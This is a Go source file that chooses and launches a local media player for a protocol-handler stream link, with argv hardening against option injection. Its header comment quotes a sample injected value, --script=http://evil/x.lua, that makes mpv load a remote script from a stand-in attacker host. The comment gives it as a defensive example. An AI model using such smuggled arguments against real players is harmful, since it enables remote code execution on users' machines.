package main

// Player dispatch for protocol-handler mode (see open.go for the parser and
// the security model). Selection order: explicit override (UNARR_DESKTOP_PLAYER
// env, then config.toml `[desktop] player`) → autodetect (mpv > vlc > iina >
// mpc-hc) → browser fallback so the click always plays SOMETHING.
//
// SECURITY: argv is always an array handed to exec (never a shell), and for
// players that support it the attacker-influenced URL goes AFTER a `--`
// end-of-options terminator — a "URL" like --script=http://evil/x.lua passed
// to mpv without `--` is remote code execution (the mpv-handler CVE class).
// mpc-hc has no terminator, so anything that could read as a switch is
// rejected outright (defense-in-depth; the http(s) whitelist in open.go
// should already make that unreachable).

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"

	"github.com/pkg/browser"

	"github.com/Unarr-app/unarr-cli/internal/config"
	"github.com/Unarr-app/unarr-cli/internal/notify"
)

// playerKind enumerates the players the dispatcher knows how to drive.
type playerKind string

const (
	playerMPV  playerKind = "mpv"
	playerVLC  playerKind = "vlc"
	playerIINA playerKind = "iina"
	playerMPC  playerKind = "mpc"
)

// autodetectOrder: mpv first (richest CLI: start/title/lang all supported and
// it's what we recommend installing), then VLC (ubiquitous), then the per-OS
// players. resolvePlayer skips entries that don't apply to the host OS.
var autodetectOrder = []playerKind{playerMPV, playerVLC, playerIINA, playerMPC}

// player is a resolved, launchable choice: which flag dialect to speak (kind)
// and the binary to spawn (bin — `open` for IINA, which has no CLI of its own).
type player struct {
	kind playerKind
	bin  string
}

// Test seams — swapped in tests so player discovery and process spawning can
// be faked and the exact argv asserted without launching anything real.
// notify.Send is included because it best-effort spawns notify-send/osascript,
// which would pop real desktop notifications during `go test`.
var (
	lookPath      = exec.LookPath
	statFile      = os.Stat
	hostGOOS      = runtime.GOOS
	notifySend    = notify.Send
	openInBrowser = browser.OpenURL
	startProc     = func(argv []string) error {
		cmd := exec.Command(argv[0], argv[1:]...)
		// The dispatcher is ephemeral and window-less; the player's startup
		// errors should still land somewhere an operator can see.
		cmd.Stderr = os.Stderr
		// Start, never Wait: the player outlives this process.
		return cmd.Start()
	}
)

// iinaAppPath: IINA installs no PATH binary — presence of the .app bundle is
// the detection signal, and launching goes through `open -a IINA`.
const iinaAppPath = "/Applications/IINA.app"

// resolvePlayer maps a normalized player name to a launchable binary on THIS
// OS. ok=false means not installed or not applicable here (e.g. iina on
// Linux) — callers treat both the same: try the next candidate.
func resolvePlayer(name string) (player, bool) {
	switch name {
	case "mpv":
		if p, err := lookPath("mpv"); err == nil {
			return player{playerMPV, p}, true
		}
	case "vlc":
		if p, err := lookPath("vlc"); err == nil {
			return player{playerVLC, p}, true
		}
	case "iina":
		if hostGOOS != "darwin" {
			return player{}, false
		}
		if _, err := statFile(iinaAppPath); err != nil {
			return player{}, false
		}
		if p, err := lookPath("open"); err == nil {
			return player{playerIINA, p}, true
		}
	case "mpc", "mpc-hc":
		if hostGOOS != "windows" {
			return player{}, false
		}
		for _, cand := range []string{"mpc-hc64.exe", "mpc-hc.exe"} {
			if p, err := lookPath(cand); err == nil {
				return player{playerMPC, p}, true
			}
		}
	}
	return player{}, false
}

// playerOverride returns the normalized explicit player choice, if any. The
// env var wins over config.toml so a one-off `UNARR_DESKTOP_PLAYER=vlc` test
// run needs no file edit. The config value is read straight off config.Load —
// note Load() deliberately does NOT apply env overrides (known gotcha of that
// package); the only env var this feature honors is checked first right here,
// so cfg.ApplyEnvOverrides() would add nothing.
func playerOverride() string {
	if v := strings.ToLower(strings.TrimSpace(os.Getenv("UNARR_DESKTOP_PLAYER"))); v != "" {
		return v
	}
	cfg, err := config.Load("")
	if err != nil {
		// A broken config must not break playback — autodetect instead.
		fmt.Fprintln(os.Stderr, "unarr-desktop: config:", err)
		return ""
	}
	return strings.ToLower(strings.TrimSpace(cfg.Desktop.Player))
}

// selectPlayer picks the player to launch. An override naming a player that
// can't be resolved (not installed, wrong OS, typo) WARNS and falls through
// to autodetect — playing through the "wrong" player beats not playing.
func selectPlayer() (player, bool) {
	if name := playerOverride(); name != "" {
		if p, ok := resolvePlayer(name); ok {
			return p, true
		}
		fmt.Fprintf(os.Stderr, "unarr-desktop: configured player %q not available, autodetecting\n", name)
	}
	for _, k := range autodetectOrder {
		if p, ok := resolvePlayer(string(k)); ok {
			return p, true
		}
	}
	return player{}, false
}

// buildPlayerArgv builds the exact argv (binary first) for the chosen player.
// Optional fields only appear when set, and always as single `--flag=value`
// tokens — a title starting with "--" stays inside its token and can never
// become a separate switch. See the file header for why `--` placement is
// load-bearing.
func buildPlayerArgv(p player, req playRequest) ([]string, error) {
	switch p.kind {
	case playerMPV:
		argv := []string{p.bin}
		if req.Start > 0 {
			argv = append(argv, "--start="+strconv.Itoa(req.Start))
		}
		if req.Title != "" {
			argv = append(argv, "--force-media-title="+req.Title)
		}
		if len(req.ALang) > 0 {
			argv = append(argv, "--alang="+strings.Join(req.ALang, ","))
		}
		if len(req.SLang) > 0 {
			argv = append(argv, "--slang="+strings.Join(req.SLang, ","))
		}
		return append(argv, "--", req.URL), nil
	case playerVLC:
		argv := []string{p.bin}
		if req.Start > 0 {
			argv = append(argv, "--start-time="+strconv.Itoa(req.Start))
		}
		if req.Title != "" {
			argv = append(argv, "--meta-title="+req.Title)
		}
		if len(req.ALang) > 0 {
			argv = append(argv, "--audio-language="+strings.Join(req.ALang, ","))
		}
		if len(req.SLang) > 0 {
			argv = append(argv, "--sub-language="+strings.Join(req.SLang, ","))
		}
		return append(argv, "--", req.URL), nil
	case playerIINA:
		// v1: just hand the URL over. Extras would need `open --args --mpv-*`,
		// which replaces open's own URL handling — not worth it yet.
		return []string{p.bin, "-a", "IINA", req.URL}, nil
	case playerMPC:
		// mpc-hc parses /switches and has no end-of-options terminator, so a
		// URL that even LOOKS like a switch is refused (see file header).
		if strings.HasPrefix(req.URL, "-") || strings.HasPrefix(req.URL, "/") {
			return nil, fmt.Errorf("refusing stream url %q for mpc-hc (could be parsed as a switch)", req.URL)
		}
		argv := []string{p.bin, req.URL}
		if req.Start > 0 {
			argv = append(argv, "/start", strconv.Itoa(req.Start*1000)) // mpc-hc takes milliseconds
		}
		return argv, nil
	}
	return nil, fmt.Errorf("unknown player kind %q", p.kind)
}

// dispatchPlayer launches req in the best available local player, falling
// back to the system browser (the web player can always play the stream) when
// no player is installed or the spawn fails. Exit codes as in runOpen.
func dispatchPlayer(req playRequest) int {
	p, ok := selectPlayer()
	if !ok {
		fmt.Fprintln(os.Stderr, "unarr-desktop: no supported media player found (mpv/vlc/iina/mpc-hc)")
		notifySend("No media player found",
			"Install mpv (recommended) or VLC for the best experience. Opening in your browser instead.")
		return openFallback(req.URL)
	}
	argv, err := buildPlayerArgv(p, req)
	if err != nil {
		fmt.Fprintln(os.Stderr, "unarr-desktop: open:", err)
		notifySend("unarr could not play this link", err.Error())
		return 2
	}
	if err := startProc(argv); err != nil {
		fmt.Fprintf(os.Stderr, "unarr-desktop: start %s: %v\n", p.kind, err)
		notifySend("Could not start "+string(p.kind), "Opening the stream in your browser instead.")
		return openFallback(req.URL)
	}
	return 0
}

// openFallback opens the (already validated http/https) stream URL in the
// default browser — worst case the user still gets playback there.
func openFallback(streamURL string) int {
	if err := openInBrowser(streamURL); err != nil {
		fmt.Fprintln(os.Stderr, "unarr-desktop: browser fallback:", err)
		return 1
	}
	return 0
}
